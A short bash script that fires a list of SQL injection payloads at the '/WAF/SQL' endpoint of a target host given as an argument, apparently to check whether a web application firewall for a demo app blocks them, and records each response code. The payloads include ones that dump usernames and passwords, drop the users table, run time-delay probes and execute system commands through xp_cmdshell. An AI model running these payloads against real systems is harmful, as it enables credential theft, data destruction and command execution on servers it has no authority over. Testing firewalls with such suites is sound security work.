#!/bin/bash
# SQL injection attacks against DemoApp /WAF/SQL endpoint
set -euo pipefail

TARGET="${1:?Usage: $0 <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] SQLi attacks against ${TARGET} /WAF/SQL"

PAYLOADS=(
  "5' OR '1'='1"
  "5' OR '1'='1'--"
  "5' UNION SELECT NULL,NULL--"
  "5' UNION SELECT username,password FROM users--"
  "5'; DROP TABLE users;--"
  "5' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
  "5' WAITFOR DELAY '0:0:5'--"
  "5' AND (SELECT COUNT(*) FROM sysobjects)>0--"
  "1 OR 1=1"
  "' OR ''='"
  "admin'--"
  "5' AND SUBSTRING(@@version,1,1)='M'--"
  "5'; EXEC xp_cmdshell('whoami');--"
  "5' UNION ALL SELECT NULL,CONCAT(username,':',password) FROM users--"
  "-1 OR 17-7=10"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "$payload")
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    "${BASE}/WAF/SQL?age=${encoded}") || code="ERR"
  printf "  [%s] %s\n" "${code}" "${payload}"
done

echo "[*] SQLi suite complete"
